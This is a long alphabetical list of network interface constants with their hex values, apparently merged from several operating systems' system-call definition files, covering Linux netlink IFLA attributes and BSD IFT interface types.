IFLA_BOND_LP_INTERVAL                      = 0x13
IFLA_BOND_MIIMON                           = 0x3
IFLA_BOND_MIN_LINKS                        = 0x12
IFLA_BOND_MODE                             = 0x1
IFLA_BOND_NUM_PEER_NOTIF                   = 0x10
IFLA_BOND_PACKETS_PER_SLAVE                = 0x14
IFLA_BOND_PEER_NOTIF_DELAY                 = 0x1c
IFLA_BOND_PRIMARY                          = 0xb
IFLA_BOND_PRIMARY_RESELECT                 = 0xc
IFLA_BOND_RESEND_IGMP                      = 0xf
IFLA_BOND_SLAVE_AD_ACTOR_OPER_PORT_STATE   = 0x7
IFLA_BOND_SLAVE_AD_AGGREGATOR_ID           = 0x6
IFLA_BOND_SLAVE_AD_PARTNER_OPER_PORT_STATE = 0x8
IFLA_BOND_SLAVE_LINK_FAILURE_COUNT         = 0x3
IFLA_BOND_SLAVE_MII_STATUS                 = 0x2
IFLA_BOND_SLAVE_PERM_HWADDR                = 0x4
IFLA_BOND_SLAVE_QUEUE_ID                   = 0x5
IFLA_BOND_SLAVE_STATE                      = 0x1
IFLA_BOND_SLAVE_UNSPEC                     = 0x0
IFLA_BOND_TLB_DYNAMIC_LB                   = 0x1b
IFLA_BOND_UNSPEC                           = 0x0
IFLA_BOND_UPDELAY                          = 0x4
IFLA_BOND_USE_CARRIER                      = 0x6
IFLA_BOND_XMIT_HASH_POLICY                 = 0xe
IFLA_BROADCAST                             = 0x2
IFLA_BRPORT_BACKUP_PORT                    = 0x22
IFLA_BRPORT_BCAST_FLOOD                    = 0x1e
IFLA_BRPORT_BRIDGE_ID                      = 0xe
IFLA_BRPORT_CONFIG_PENDING                 = 0x14
IFLA_BRPORT_COST                           = 0x3
IFLA_BRPORT_DESIGNATED_COST                = 0x10
IFLA_BRPORT_DESIGNATED_PORT                = 0xf
IFLA_BRPORT_FAST_LEAVE                     = 0x7
IFLA_BRPORT_FLUSH                          = 0x18
IFLA_BRPORT_FORWARD_DELAY_TIMER            = 0x16
IFLA_BRPORT_GROUP_FWD_MASK                 = 0x1f
IFLA_BRPORT_GUARD                          = 0x5
IFLA_BRPORT_HOLD_TIMER                     = 0x17
IFLA_BRPORT_ID                             = 0x11
IFLA_BRPORT_ISOLATED                       = 0x21
IFLA_BRPORT_LEARNING                       = 0x8
IFLA_BRPORT_LEARNING_SYNC                  = 0xb
IFLA_BRPORT_MCAST_FLOOD                    = 0x1b
IFLA_BRPORT_MCAST_TO_UCAST                 = 0x1c
IFLA_BRPORT_MESSAGE_AGE_TIMER              = 0x15
IFLA_BRPORT_MODE                           = 0x4
IFLA_BRPORT_MRP_IN_OPEN                    = 0x24
IFLA_BRPORT_MRP_RING_OPEN                  = 0x23
IFLA_BRPORT_MULTICAST_ROUTER               = 0x19
IFLA_BRPORT_NEIGH_SUPPRESS                 = 0x20
IFLA_BRPORT_NO                             = 0x12
IFLA_BRPORT_PAD                            = 0x1a
IFLA_BRPORT_PRIORITY                       = 0x2
IFLA_BRPORT_PROTECT                        = 0x6
IFLA_BRPORT_PROXYARP                       = 0xa
IFLA_BRPORT_PROXYARP_WIFI                  = 0xc
IFLA_BRPORT_ROOT_ID                        = 0xd
IFLA_BRPORT_STATE                          = 0x1
IFLA_BRPORT_TOPOLOGY_CHANGE_ACK            = 0x13
IFLA_BRPORT_UNICAST_FLOOD                  = 0x9
IFLA_BRPORT_UNSPEC                         = 0x0
IFLA_BRPORT_VLAN_TUNNEL                    = 0x1d
IFLA_BR_AGEING_TIME                        = 0x4
IFLA_BR_BRIDGE_ID                          = 0xb
IFLA_BR_FDB_FLUSH                          = 0x15
IFLA_BR_FORWARD_DELAY                      = 0x1
IFLA_BR_GC_TIMER                           = 0x13
IFLA_BR_GROUP_ADDR                         = 0x14
IFLA_BR_GROUP_FWD_MASK                     = 0x9
IFLA_BR_HELLO_TIME                         = 0x2
IFLA_BR_HELLO_TIMER                        = 0x10
IFLA_BR_MAX_AGE                            = 0x3
IFLA_BR_MCAST_HASH_ELASTICITY              = 0x1a
IFLA_BR_MCAST_HASH_MAX                     = 0x1b
IFLA_BR_MCAST_IGMP_VERSION                 = 0x2b
IFLA_BR_MCAST_LAST_MEMBER_CNT              = 0x1c
IFLA_BR_MCAST_LAST_MEMBER_INTVL            = 0x1e
IFLA_BR_MCAST_MEMBERSHIP_INTVL             = 0x1f
IFLA_BR_MCAST_MLD_VERSION                  = 0x2c
IFLA_BR_MCAST_QUERIER                      = 0x19
IFLA_BR_MCAST_QUERIER_INTVL                = 0x20
IFLA_BR_MCAST_QUERY_INTVL                  = 0x21
IFLA_BR_MCAST_QUERY_RESPONSE_INTVL         = 0x22
IFLA_BR_MCAST_QUERY_USE_IFADDR             = 0x18
IFLA_BR_MCAST_ROUTER                       = 0x16
IFLA_BR_MCAST_SNOOPING                     = 0x17
IFLA_BR_MCAST_STARTUP_QUERY_CNT            = 0x1d
IFLA_BR_MCAST_STARTUP_QUERY_INTVL          = 0x23
IFLA_BR_MCAST_STATS_ENABLED                = 0x2a
IFLA_BR_MULTI_BOOLOPT                      = 0x2e
IFLA_BR_NF_CALL_ARPTABLES                  = 0x26
IFLA_BR_NF_CALL_IP6TABLES                  = 0x25
IFLA_BR_NF_CALL_IPTABLES                   = 0x24
IFLA_BR_PAD                                = 0x28
IFLA_BR_PRIORITY                           = 0x6
IFLA_BR_ROOT_ID                            = 0xa
IFLA_BR_ROOT_PATH_COST                     = 0xd
IFLA_BR_ROOT_PORT                          = 0xc
IFLA_BR_STP_STATE                          = 0x5
IFLA_BR_TCN_TIMER                          = 0x11
IFLA_BR_TOPOLOGY_CHANGE                    = 0xe
IFLA_BR_TOPOLOGY_CHANGE_DETECTED           = 0xf
IFLA_BR_TOPOLOGY_CHANGE_TIMER              = 0x12
IFLA_BR_UNSPEC                             = 0x0
IFLA_BR_VLAN_DEFAULT_PVID                  = 0x27
IFLA_BR_VLAN_FILTERING                     = 0x7
IFLA_BR_VLAN_PROTOCOL                      = 0x8
IFLA_BR_VLAN_STATS_ENABLED                 = 0x29
IFLA_BR_VLAN_STATS_PER_PORT                = 0x2d
IFLA_CAN_BERR_COUNTER         = 0x8
IFLA_CAN_BITRATE_CONST        = 0xd
IFLA_CAN_BITRATE_MAX          = 0xf
IFLA_CAN_BITTIMING            = 0x1
IFLA_CAN_BITTIMING_CONST      = 0x2
IFLA_CAN_CLOCK                = 0x3
IFLA_CAN_CTRLMODE             = 0x5
IFLA_CAN_DATA_BITRATE_CONST   = 0xe
IFLA_CAN_DATA_BITTIMING       = 0x9
IFLA_CAN_DATA_BITTIMING_CONST = 0xa
IFLA_CAN_RESTART              = 0x7
IFLA_CAN_RESTART_MS           = 0x6
IFLA_CAN_STATE                = 0x4
IFLA_CAN_TERMINATION          = 0xb
IFLA_CAN_TERMINATION_CONST    = 0xc
IFLA_CAN_UNSPEC               = 0x0
IFLA_CARRIER                               = 0x21
IFLA_CARRIER_CHANGES                       = 0x23
IFLA_CARRIER_DOWN_COUNT                    = 0x30
IFLA_CARRIER_UP_COUNT                      = 0x2f
IFLA_COST                                  = 0x8
IFLA_EVENT                                 = 0x2c
IFLA_EVENT_BONDING_FAILOVER                = 0x3
IFLA_EVENT_BONDING_OPTIONS                 = 0x6
IFLA_EVENT_FEATURES                        = 0x2
IFLA_EVENT_IGMP_RESEND                     = 0x5
IFLA_EVENT_NONE                            = 0x0
IFLA_EVENT_NOTIFY_PEERS                    = 0x4
IFLA_EVENT_REBOOT                          = 0x1
IFLA_EXT_MASK                              = 0x1d
IFLA_GENEVE_COLLECT_METADATA               = 0x6
IFLA_GENEVE_DF                             = 0xd
IFLA_GENEVE_ID                             = 0x1
IFLA_GENEVE_LABEL                          = 0xb
IFLA_GENEVE_PORT                           = 0x5
IFLA_GENEVE_REMOTE                         = 0x2
IFLA_GENEVE_REMOTE6                        = 0x7
IFLA_GENEVE_TOS                            = 0x4
IFLA_GENEVE_TTL                            = 0x3
IFLA_GENEVE_TTL_INHERIT                    = 0xc
IFLA_GENEVE_UDP_CSUM                       = 0x8
IFLA_GENEVE_UDP_ZERO_CSUM6_RX              = 0xa
IFLA_GENEVE_UDP_ZERO_CSUM6_TX              = 0x9
IFLA_GENEVE_UNSPEC                         = 0x0
IFLA_GROUP                                 = 0x1b
IFLA_GSO_MAX_SEGS                          = 0x28
IFLA_GSO_MAX_SIZE                          = 0x29
IFLA_GTP_FD0                               = 0x1
IFLA_GTP_FD1                               = 0x2
IFLA_GTP_PDP_HASHSIZE                      = 0x3
IFLA_GTP_ROLE                              = 0x4
IFLA_GTP_UNSPEC                            = 0x0
IFLA_HSR_MULTICAST_SPEC                    = 0x3
IFLA_HSR_PROTOCOL                          = 0x7
IFLA_HSR_SEQ_NR                            = 0x5
IFLA_HSR_SLAVE1                            = 0x1
IFLA_HSR_SLAVE2                            = 0x2
IFLA_HSR_SUPERVISION_ADDR                  = 0x4
IFLA_HSR_UNSPEC                            = 0x0
IFLA_HSR_VERSION                           = 0x6
IFLA_IFALIAS                               = 0x14
IFLA_IFNAME                                = 0x3
IFLA_IF_NETNSID                            = 0x2e
IFLA_INET6_ADDR_GEN_MODE                   = 0x8
IFLA_INET6_CACHEINFO                       = 0x5
IFLA_INET6_CONF                            = 0x2
IFLA_INET6_FLAGS                           = 0x1
IFLA_INET6_ICMP6STATS                      = 0x6
IFLA_INET6_MCAST                           = 0x4
IFLA_INET6_STATS                           = 0x3
IFLA_INET6_TOKEN                           = 0x7
IFLA_INET6_UNSPEC                          = 0x0
IFLA_INET_CONF                             = 0x1
IFLA_INET_UNSPEC                           = 0x0
IFLA_INFO_DATA                             = 0x2
IFLA_INFO_KIND                             = 0x1
IFLA_INFO_SLAVE_DATA                       = 0x5
IFLA_INFO_SLAVE_KIND                       = 0x4
IFLA_INFO_UNSPEC                           = 0x0
IFLA_INFO_XSTATS                           = 0x3
IFLA_IPOIB_MODE                            = 0x2
IFLA_IPOIB_PKEY                            = 0x1
IFLA_IPOIB_UMCAST                          = 0x3
IFLA_IPOIB_UNSPEC                          = 0x0
IFLA_IPVLAN_FLAGS                          = 0x2
IFLA_IPVLAN_MODE                           = 0x1
IFLA_IPVLAN_UNSPEC                         = 0x0
IFLA_LINK                                  = 0x5
IFLA_LINKINFO                              = 0x12
IFLA_LINKMODE                              = 0x11
IFLA_LINK_NETNSID                          = 0x25
IFLA_MACSEC_CIPHER_SUITE                   = 0x4
IFLA_MACSEC_ENCODING_SA                    = 0x6
IFLA_MACSEC_ENCRYPT                        = 0x7
IFLA_MACSEC_ES                             = 0xa
IFLA_MACSEC_ICV_LEN                        = 0x3
IFLA_MACSEC_INC_SCI                        = 0x9
IFLA_MACSEC_OFFLOAD                        = 0xf
IFLA_MACSEC_PAD                            = 0xe
IFLA_MACSEC_PORT                           = 0x2
IFLA_MACSEC_PROTECT                        = 0x8
IFLA_MACSEC_REPLAY_PROTECT                 = 0xc
IFLA_MACSEC_SCB                            = 0xb
IFLA_MACSEC_SCI                            = 0x1
IFLA_MACSEC_UNSPEC                         = 0x0
IFLA_MACSEC_VALIDATION                     = 0xd
IFLA_MACSEC_WINDOW                         = 0x5
IFLA_MACVLAN_FLAGS                         = 0x2
IFLA_MACVLAN_MACADDR                       = 0x4
IFLA_MACVLAN_MACADDR_COUNT                 = 0x6
IFLA_MACVLAN_MACADDR_DATA                  = 0x5
IFLA_MACVLAN_MACADDR_MODE                  = 0x3
IFLA_MACVLAN_MODE                          = 0x1
IFLA_MACVLAN_UNSPEC                        = 0x0
IFLA_MAP                                   = 0xe
IFLA_MASTER                                = 0xa
IFLA_MAX_MTU                               = 0x33
IFLA_MIN_MTU                               = 0x32
IFLA_MTU                                   = 0x4
IFLA_NET_NS_FD                             = 0x1c
IFLA_NET_NS_PID                            = 0x13
IFLA_NEW_IFINDEX                           = 0x31
IFLA_NEW_NETNSID                           = 0x2d
IFLA_NUM_RX_QUEUES                         = 0x20
IFLA_NUM_TX_QUEUES                         = 0x1f
IFLA_NUM_VF                                = 0x15
IFLA_OFFLOAD_XSTATS_CPU_HIT                = 0x1
IFLA_OFFLOAD_XSTATS_UNSPEC                 = 0x0
IFLA_OPERSTATE                             = 0x10
IFLA_PAD                                   = 0x2a
IFLA_PERM_ADDRESS                          = 0x36
IFLA_PHYS_PORT_ID                          = 0x22
IFLA_PHYS_PORT_NAME                        = 0x26
IFLA_PHYS_SWITCH_ID                        = 0x24
IFLA_PORT_HOST_UUID                        = 0x5
IFLA_PORT_INSTANCE_UUID                    = 0x4
IFLA_PORT_PROFILE                          = 0x2
IFLA_PORT_REQUEST                          = 0x6
IFLA_PORT_RESPONSE                         = 0x7
IFLA_PORT_SELF                             = 0x19
IFLA_PORT_UNSPEC                           = 0x0
IFLA_PORT_VF                               = 0x1
IFLA_PORT_VSI_TYPE                         = 0x3
IFLA_PPP_DEV_FD                            = 0x1
IFLA_PPP_UNSPEC                            = 0x0
IFLA_PRIORITY                              = 0x9
IFLA_PROMISCUITY                           = 0x1e
IFLA_PROP_LIST                             = 0x34
IFLA_PROTINFO                              = 0xc
IFLA_PROTO_DOWN                            = 0x27
IFLA_PROTO_DOWN_REASON                     = 0x37
IFLA_PROTO_DOWN_REASON_MASK                = 0x1
IFLA_PROTO_DOWN_REASON_MAX                 = 0x2
IFLA_PROTO_DOWN_REASON_UNSPEC              = 0x0
IFLA_PROTO_DOWN_REASON_VALUE               = 0x2
IFLA_QDISC                                 = 0x6
IFLA_RMNET_FLAGS                           = 0x2
IFLA_RMNET_MUX_ID                          = 0x1
IFLA_RMNET_UNSPEC                          = 0x0
IFLA_STATS                                 = 0x7
IFLA_STATS64                               = 0x17
IFLA_STATS_AF_SPEC                         = 0x5
IFLA_STATS_LINK_64                         = 0x1
IFLA_STATS_LINK_OFFLOAD_XSTATS             = 0x4
IFLA_STATS_LINK_XSTATS                     = 0x2
IFLA_STATS_LINK_XSTATS_SLAVE               = 0x3
IFLA_STATS_UNSPEC                          = 0x0
IFLA_TARGET_NETNSID                        = 0x2e
IFLA_TUN_GROUP                             = 0x2
IFLA_TUN_MULTI_QUEUE                       = 0x7
IFLA_TUN_NUM_DISABLED_QUEUES               = 0x9
IFLA_TUN_NUM_QUEUES                        = 0x8
IFLA_TUN_OWNER                             = 0x1
IFLA_TUN_PERSIST                           = 0x6
IFLA_TUN_PI                                = 0x4
IFLA_TUN_TYPE                              = 0x3
IFLA_TUN_UNSPEC                            = 0x0
IFLA_TUN_VNET_HDR                          = 0x5
IFLA_TXQLEN                                = 0xd
IFLA_UNSPEC                                = 0x0
IFLA_VFINFO_LIST                           = 0x16
IFLA_VF_BROADCAST                          = 0xd
IFLA_VF_IB_NODE_GUID                       = 0xa
IFLA_VF_IB_PORT_GUID                       = 0xb
IFLA_VF_INFO                               = 0x1
IFLA_VF_INFO_UNSPEC                        = 0x0
IFLA_VF_LINK_STATE                         = 0x5
IFLA_VF_LINK_STATE_AUTO                    = 0x0
IFLA_VF_LINK_STATE_DISABLE                 = 0x2
IFLA_VF_LINK_STATE_ENABLE                  = 0x1
IFLA_VF_MAC                                = 0x1
IFLA_VF_PORT                               = 0x1
IFLA_VF_PORTS                              = 0x18
IFLA_VF_PORT_UNSPEC                        = 0x0
IFLA_VF_RATE                               = 0x6
IFLA_VF_RSS_QUERY_EN                       = 0x7
IFLA_VF_SPOOFCHK                           = 0x4
IFLA_VF_STATS                              = 0x8
IFLA_VF_STATS_BROADCAST                    = 0x4
IFLA_VF_STATS_MULTICAST                    = 0x5
IFLA_VF_STATS_PAD                          = 0x6
IFLA_VF_STATS_RX_BYTES                     = 0x2
IFLA_VF_STATS_RX_DROPPED                   = 0x7
IFLA_VF_STATS_RX_PACKETS                   = 0x0
IFLA_VF_STATS_TX_BYTES                     = 0x3
IFLA_VF_STATS_TX_DROPPED                   = 0x8
IFLA_VF_STATS_TX_PACKETS                   = 0x1
IFLA_VF_TRUST                              = 0x9
IFLA_VF_TX_RATE                            = 0x3
IFLA_VF_UNSPEC                             = 0x0
IFLA_VF_VLAN                               = 0x2
IFLA_VF_VLAN_INFO                          = 0x1
IFLA_VF_VLAN_INFO_UNSPEC                   = 0x0
IFLA_VF_VLAN_LIST                          = 0xc
IFLA_VLAN_EGRESS_QOS                       = 0x3
IFLA_VLAN_FLAGS                            = 0x2
IFLA_VLAN_ID                               = 0x1
IFLA_VLAN_INGRESS_QOS                      = 0x4
IFLA_VLAN_PROTOCOL                         = 0x5
IFLA_VLAN_QOS_MAPPING                      = 0x1
IFLA_VLAN_QOS_UNSPEC                       = 0x0
IFLA_VLAN_UNSPEC                           = 0x0
IFLA_VRF_PORT_TABLE                        = 0x1
IFLA_VRF_PORT_UNSPEC                       = 0x0
IFLA_VRF_TABLE                             = 0x1
IFLA_VRF_UNSPEC                            = 0x0
IFLA_VXLAN_AGEING                          = 0x8
IFLA_VXLAN_COLLECT_METADATA                = 0x19
IFLA_VXLAN_DF                              = 0x1d
IFLA_VXLAN_GBP                             = 0x17
IFLA_VXLAN_GPE                             = 0x1b
IFLA_VXLAN_GROUP                           = 0x2
IFLA_VXLAN_GROUP6                          = 0x10
IFLA_VXLAN_ID                              = 0x1
IFLA_VXLAN_L2MISS                          = 0xd
IFLA_VXLAN_L3MISS                          = 0xe
IFLA_VXLAN_LABEL                           = 0x1a
IFLA_VXLAN_LEARNING                        = 0x7
IFLA_VXLAN_LIMIT                           = 0x9
IFLA_VXLAN_LINK                            = 0x3
IFLA_VXLAN_LOCAL                           = 0x4
IFLA_VXLAN_LOCAL6                          = 0x11
IFLA_VXLAN_PORT                            = 0xf
IFLA_VXLAN_PORT_RANGE                      = 0xa
IFLA_VXLAN_PROXY                           = 0xb
IFLA_VXLAN_REMCSUM_NOPARTIAL               = 0x18
IFLA_VXLAN_REMCSUM_RX                      = 0x16
IFLA_VXLAN_REMCSUM_TX                      = 0x15
IFLA_VXLAN_RSC                             = 0xc
IFLA_VXLAN_TOS                             = 0x6
IFLA_VXLAN_TTL                             = 0x5
IFLA_VXLAN_TTL_INHERIT                     = 0x1c
IFLA_VXLAN_UDP_CSUM                        = 0x12
IFLA_VXLAN_UDP_ZERO_CSUM6_RX               = 0x14
IFLA_VXLAN_UDP_ZERO_CSUM6_TX               = 0x13
IFLA_VXLAN_UNSPEC                          = 0x0
IFLA_WEIGHT                                = 0xf
IFLA_WIRELESS                              = 0xb
IFLA_XDP                                   = 0x2b
IFLA_XDP_ATTACHED                          = 0x2
IFLA_XDP_DRV_PROG_ID                       = 0x5
IFLA_XDP_EXPECTED_FD                       = 0x8
IFLA_XDP_FD                                = 0x1
IFLA_XDP_FLAGS                             = 0x3
IFLA_XDP_HW_PROG_ID                        = 0x7
IFLA_XDP_PROG_ID                           = 0x4
IFLA_XDP_SKB_PROG_ID                       = 0x6
IFLA_XDP_UNSPEC                            = 0x0
IFLA_XFRM_IF_ID                            = 0x2
IFLA_XFRM_LINK                             = 0x1
IFLA_XFRM_UNSPEC                           = 0x0
IFNAMSIZ
IFNAMSIZ                                    = 0x10
IFNAMSIZ                                = 0x10
IFNAMSIZ                          = 0x10
IFNAMSIZ                       = 0x10
IFNAMSIZ                      = 0x10
IFO_FLUSH                     = 0x1
IFT_1822                                = 0x2
IFT_1822                          = 0x2
IFT_1822                      = 0x2
IFT_6LOWPAN                             = 0x40
IFT_6TO4                      = 0xca
IFT_A12MPPSWITCH                  = 0x82
IFT_AAL2                          = 0xbb
IFT_AAL5                                = 0x31
IFT_AAL5                          = 0x31
IFT_AAL5                      = 0x31
IFT_ADSL                          = 0x5e
IFT_AFLANE8023                    = 0x3b
IFT_AFLANE8025                    = 0x3c
IFT_ARAP                          = 0x58
IFT_ARCNET                              = 0x23
IFT_ARCNET                        = 0x23
IFT_ARCNET                    = 0x23
IFT_ARCNETPLUS                          = 0x24
IFT_ARCNETPLUS                    = 0x24
IFT_ARCNETPLUS                = 0x24
IFT_ASYNC                         = 0x54
IFT_ATM                                 = 0x25
IFT_ATM                           = 0x25
IFT_ATM                       = 0x25
IFT_ATMDXI                        = 0x69
IFT_ATMFUNI                       = 0x6a
IFT_ATMIMA                        = 0x6b
IFT_ATMLOGICAL                    = 0x50
IFT_ATMRADIO                      = 0xbd
IFT_ATMSUBINTERFACE               = 0x86
IFT_ATMVCIENDPT                   = 0xc2
IFT_ATMVIRTUAL                    = 0x95
IFT_BGPPOLICYACCOUNTING           = 0xa2
IFT_BLUETOOTH                     = 0xf8
IFT_BRIDGE                              = 0xd1
IFT_BRIDGE                        = 0xd1
IFT_BRIDGE                     = 0xd1
IFT_BSC                           = 0x53
IFT_CARP                                = 0xf8
IFT_CARP                          = 0xf7
IFT_CARP                          = 0xf8
IFT_CARP                       = 0xf8
IFT_CCTEMUL                       = 0x3d
IFT_CELLULAR                            = 0xff
IFT_CEPT                                = 0x13
IFT_CEPT                          = 0x13
IFT_CEPT                      = 0x13
IFT_CES                           = 0x85
IFT_CHANNEL                       = 0x46
IFT_CLUSTER                   = 0x3e
IFT_CNR                           = 0x55
IFT_COFFEE                        = 0x84
IFT_COMPOSITELINK                 = 0x9b
IFT_DCN                           = 0x8d
IFT_DIGITALPOWERLINE              = 0x8a
IFT_DIGITALWRAPPEROVERHEADCHANNEL = 0xba
IFT_DLSW                          = 0x4a
IFT_DOCSCABLEDOWNSTREAM           = 0x80
IFT_DOCSCABLEMACLAYER             = 0x7f
IFT_DOCSCABLEUPSTREAM             = 0x81
IFT_DOCSCABLEUPSTREAMCHANNEL      = 0xcd
IFT_DS0                           = 0x51
IFT_DS0BUNDLE                     = 0x52
IFT_DS1FDL                        = 0xaa
IFT_DS3                                 = 0x1e
IFT_DS3                           = 0x1e
IFT_DS3                       = 0x1e
IFT_DTM                           = 0x8c
IFT_DUMMY                         = 0xf1
IFT_DVBASILN                      = 0xac
IFT_DVBASIOUT                     = 0xad
IFT_DVBRCCDOWNSTREAM              = 0x93
IFT_DVBRCCMACLAYER                = 0x92
IFT_DVBRCCUPSTREAM                = 0x94
IFT_ECONET                        = 0xce
IFT_ENC                                 = 0xf4
IFT_ENC                           = 0xf4
IFT_EON                                 = 0x19
IFT_EON                           = 0x19
IFT_EON                       = 0x19
IFT_EPLRS                         = 0x57
IFT_ESCON                         = 0x49
IFT_ETHER                               = 0x6
IFT_ETHER                         = 0x6
IFT_ETHER                     = 0x6
IFT_FAITH                               = 0x38
IFT_FAITH                         = 0xf2
IFT_FAITH                         = 0xf3
IFT_FAITH       = 0xf2
IFT_FAST                          = 0x7d
IFT_FASTETHER                     = 0x3e
IFT_FASTETHERFX                   = 0x45
IFT_FCS                       = 0x3a
IFT_FDDI                                = 0xf
IFT_FDDI                          = 0xf
IFT_FDDI                      = 0xf
IFT_FIBRECHANNEL                  = 0x38
IFT_FRAMERELAYINTERCONNECT        = 0x3a
IFT_FRAMERELAYMPI                 = 0x5c
IFT_FRDLCIENDPT                   = 0xc1
IFT_FRELAY                              = 0x20
IFT_FRELAY                        = 0x20
IFT_FRELAY                    = 0x20
IFT_FRELAYDCE                           = 0x2c
IFT_FRELAYDCE                     = 0x2c
IFT_FRELAYDCE                 = 0x2c
IFT_FRF16MFRBUNDLE                = 0xa3
IFT_FRFORWARD                     = 0x9e
IFT_G703AT2MB                     = 0x43
IFT_G703AT64K                     = 0x42
IFT_GIF                                 = 0x37
IFT_GIF                           = 0xf0
IFT_GIFTUNNEL                 = 0x3c
IFT_GIGABITETHERNET               = 0x75
IFT_GR303IDT                      = 0xb2
IFT_GR303RDT                      = 0xb1
IFT_H323GATEKEEPER                = 0xa4
IFT_H323PROXY                     = 0xa5
IFT_HDH1822                             = 0x3
IFT_HDH1822                       = 0x3
IFT_HDH1822                   = 0x3
IFT_HDLC                          = 0x76
IFT_HDSL2                         = 0xa8
IFT_HF                        = 0x3d
IFT_HIPERLAN2                     = 0xb7
IFT_HIPPI                               = 0x2f
IFT_HIPPI                         = 0x2f
IFT_HIPPI                     = 0x2f
IFT_HIPPIINTERFACE                = 0x39
IFT_HOSTPAD                       = 0x5a
IFT_HSSI                                = 0x2e
IFT_HSSI                          = 0x2e
IFT_HSSI                      = 0x2e
IFT_HY                                  = 0xe
IFT_HY                            = 0xe
IFT_HY                        = 0xe
IFT_IB                        = 0xc7
IFT_IBM370PARCHAN                 = 0x48
IFT_IDSL                          = 0x9a
IFT_IEEE1394                            = 0x90
IFT_IEEE1394                      = 0x90
IFT_IEEE1394                   = 0x90
IFT_IEEE80211                     = 0x47
IFT_IEEE80212                     = 0x37
IFT_IEEE8023ADLAG                       = 0x88
IFT_IEEE8023ADLAG                 = 0xa1
IFT_IFGSN                         = 0x91
IFT_IMT                           = 0xbe
IFT_INFINIBAND                    = 0xc7
IFT_INFINIBAND                 = 0xc7
IFT_INTERLEAVE                    = 0x7c
IFT_IP                            = 0x7e
IFT_IPFORWARD                     = 0x8e
IFT_IPOVERATM                     = 0x72
IFT_IPOVERCDLC                    = 0x6d
IFT_IPOVERCLAW                    = 0x6e
IFT_IPSWITCH                      = 0x4e
IFT_IPV4                      = 0xc8
IFT_IPV6                      = 0xc9
IFT_IPXIP                         = 0xf9
IFT_IPXIP       = 0xf9
IFT_ISDN                          = 0x3f
IFT_ISDNBASIC                           = 0x14
IFT_ISDNBASIC                     = 0x14
IFT_ISDNBASIC                 = 0x14
IFT_ISDNPRIMARY                         = 0x15
IFT_ISDNPRIMARY                   = 0x15
IFT_ISDNPRIMARY               = 0x15
IFT_ISDNS                         = 0x4b
IFT_ISDNU                         = 0x4c
IFT_ISO88022LLC                         = 0x29
IFT_ISO88022LLC                   = 0x29
IFT_ISO88022LLC               = 0x29
IFT_ISO88023                            = 0x7
IFT_ISO88023                      = 0x7
IFT_ISO88023                  = 0x7
IFT_ISO88024                            = 0x8
IFT_ISO88024                      = 0x8
IFT_ISO88024                  = 0x8
IFT_ISO88025                            = 0x9
IFT_ISO88025                      = 0x9
IFT_ISO88025                  = 0x9
IFT_ISO88025CRFPINT               = 0x62
IFT_ISO88025DTR                   = 0x56
IFT_ISO88025FIBER                 = 0x73
IFT_ISO88026                            = 0xa
IFT_ISO88026                      = 0xa
IFT_ISO88026                  = 0xa
IFT_ISUP                          = 0xb3
IFT_L2VLAN                              = 0x87
IFT_L2VLAN                        = 0x87
IFT_L2VLAN                     = 0x87
IFT_L3IPVLAN                      = 0x88
IFT_L3IPVLAN                   = 0x88
IFT_L3IPXVLAN                     = 0x89
IFT_LAPB                                = 0x10
IFT_LAPB                          = 0x10
IFT_LAPB                      = 0x10
IFT_LAPD                          = 0x4d
IFT_LAPF                          = 0x77
IFT_LINEGROUP                     = 0xd2
IFT_LOCALTALK                           = 0x2a
IFT_LOCALTALK                     = 0x2a
IFT_LOCALTALK                 = 0x2a
IFT_LOOP                                = 0x18
IFT_LOOP                          = 0x18
IFT_LOOP                      = 0x18
IFT_MBIM                          = 0xfa
IFT_MEDIAMAILOVERIP               = 0x8b
IFT_MFSIGLINK                     = 0xa7
IFT_MIOX25                              = 0x26
IFT_MIOX25                        = 0x26
IFT_MIOX25                    = 0x26
IFT_MODEM                               = 0x30
IFT_MODEM                         = 0x30
IFT_MODEM                     = 0x30
IFT_MPC                           = 0x71
IFT_MPLS                          = 0xa6
IFT_MPLSTUNNEL                    = 0x96
IFT_MSDSL                         = 0x8f
IFT_MVL                           = 0xbf
IFT_MYRINET                       = 0x63
IFT_NFAS                          = 0xaf
IFT_NSIP                                = 0x1b
IFT_NSIP                          = 0x1b
IFT_NSIP                      = 0x1b
IFT_OPTICALCHANNEL                = 0xc3
IFT_OPTICALTRANSPORT              = 0xc4
IFT_OTHER                               = 0x1
IFT_OTHER                         = 0x1
IFT_OTHER                     = 0x1
IFT_P10                                 = 0xc
IFT_P10                           = 0xc
IFT_P10                       = 0xc
IFT_P80                                 = 0xd
IFT_P80                           = 0xd
IFT_P80                       = 0xd
IFT_PARA                                = 0x22
IFT_PARA                          = 0x22
IFT_PARA                      = 0x22
IFT_PDP                                 = 0xff
IFT_PFLOG                               = 0xf5
IFT_PFLOG                         = 0xf5
IFT_PFLOG                         = 0xf6
IFT_PFLOW                         = 0xf9
IFT_PFSYNC                              = 0xf6
IFT_PFSYNC                        = 0xf6
IFT_PFSYNC                        = 0xf7
IFT_PKTAP                               = 0xfe
IFT_PLC                           = 0xae
IFT_PON155                        = 0xcf
IFT_PON622                        = 0xd0
IFT_POS                           = 0xab
IFT_PPP                                 = 0x17
IFT_PPP                           = 0x17
IFT_PPP                        = 0x17
IFT_PPP                       = 0x17
IFT_PPPMULTILINKBUNDLE            = 0x6c
IFT_PROPATM                       = 0xc5
IFT_PROPBWAP2MP                   = 0xb8
IFT_PROPCNLS                      = 0x59
IFT_PROPDOCSWIRELESSDOWNSTREAM    = 0xb5
IFT_PROPDOCSWIRELESSMACLAYER      = 0xb4
IFT_PROPDOCSWIRELESSUPSTREAM      = 0xb6
IFT_PROPMUX                             = 0x36
IFT_PROPMUX                       = 0x36
IFT_PROPMUX                   = 0x36
IFT_PROPVIRTUAL                         = 0x35
IFT_PROPVIRTUAL                   = 0x35
IFT_PROPVIRTUAL                = 0x35
IFT_PROPVIRTUAL               = 0x35
IFT_PROPWIRELESSP2P               = 0x9d
IFT_PTPSERIAL                           = 0x16
IFT_PTPSERIAL                     = 0x16
IFT_PTPSERIAL                 = 0x16
IFT_PVC                           = 0xf1
IFT_PVC                           = 0xf2
IFT_Q2931                         = 0xc9
IFT_QLLC                          = 0x44
IFT_RADIOMAC                      = 0xbc
IFT_RADSL                         = 0x5f
IFT_REACHDSL                      = 0xc0
IFT_RFC1483                       = 0x9f
IFT_RS232                               = 0x21
IFT_RS232                         = 0x21
IFT_RS232                     = 0x21
IFT_RSRB                          = 0x4f
IFT_SDLC                                = 0x11
IFT_SDLC                          = 0x11
IFT_SDLC                      = 0x11
